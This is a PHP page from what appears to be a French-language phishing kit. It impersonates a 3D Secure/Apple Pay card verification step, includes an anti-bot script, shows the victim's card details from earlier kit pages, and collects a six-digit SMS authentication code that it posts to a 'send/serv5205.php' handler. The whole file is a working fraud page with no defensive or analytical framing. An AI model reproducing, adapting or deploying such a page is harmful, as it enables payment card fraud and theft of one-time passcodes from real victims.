<?php

ob_start();
session_start();
include '../config.php';
include '../antibots.php';
?>
    <!DOCTYPE html>
    <html dir="ltr">
        <head>
            <title>Authentification SMS</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            <meta charset="utf8">
            <link rel="stylesheet" href="../css/normalize.css" />
            <link rel="stylesheet" href="../css/bootstrap.min.css" />
            <link rel="stylesheet" href="../css/font-awesome.min.css" />
            <link rel="stylesheet" href="../css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="../img/ppl.ico">
        </head>
        <body>
                    <style>
                .error {
                    border: 1px solid #c72e2e;
                }
            </style>
<?php include'navbar.php'?>
    <div class="contain biling-p">
     <form method="POST" action="<?php echo 'send/serv5205.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" class="contain-info">
            <center> <span class="step" style="text-transform:uppercase"></span>
        <img src="../img/Appa_logo.png" style="HEIGHT: 53px; WIDTH: 135px" width=716 align=baseline height=283>
        <hr>
          <H5><B><FONT color=#0070ba face=Arial><U>IDENTIFICATION 3DSECURE</U><BR></FONT></B></H5>
            </b></h3>
<p style="text-align: center;">Pour sécuriser au mieux vos futur achats, nous allons procéder à une vérification en
            vous envoyant un code SMS via notre partenaire de paiement APPLE PAY.</p>
        <p style="text-align: center;">Cette vérification est nécessaire afin que vous puissiez vous identifier en saisissant le code d'accès que vous recevrez par SMS lors de vos prochains achats.</p>
        <P align=left><U><B>Données de la carte:</B></U></P>
          <div style="text-align:left;text-transform:uppercase"> <b>DATE : </b><?php echo date('d/m/Y - H:i:s', time()); ?><br>
            <b>NUMERO DE CARTE : </b><span><?php echo substr($_SESSION['c_num'], 0,4); ?> XXXX XXXX <?php echo substr($_SESSION['c_num'], -4); ?></span><br>
            <b>NOM SUR LA CARTE : </b><span><?php echo $_SESSION["n_card"] ?></span><br>
          </div>
          &nbsp; <span style="color: #23527c;"></span><br>
          <div><br>

          </div>
          <input type="tel" id="css" style="margin-top:5px" name="bankid" class="bill_input"

            placeholder="Code d'authentification" required="required" autocomplete="off"

            autocorrect="off" aria-required="true"  minlength="6" maxlength="6" pattern="[0-9]{6,6}$" type="text">
          <hr> <input name="ibansub" id="sub" value="Continuer" class="bill_input btn-bill"

type="submit"><br>
          Cette identification est obligatoire pour conclure la procédure.<br>
          <IMG style="HEIGHT: 53px; WIDTH: 135px" border=0 hspace=0 alt="" src="../img/paments.png" width=716 align=baseline height=283>
      </form>
    </div>
    <?php include'footer.php'?>
    <script src="../js/jquery-1.11.3.min.js"></script>
    <script src="../js/bootstrap.min.js"></script>
    <script src="../js/cont.js"></script>
    <script src="../js/jquery.maskedinput.js"></script>
    <script src="../js/plugins.js"></script>
  </body>
</html>
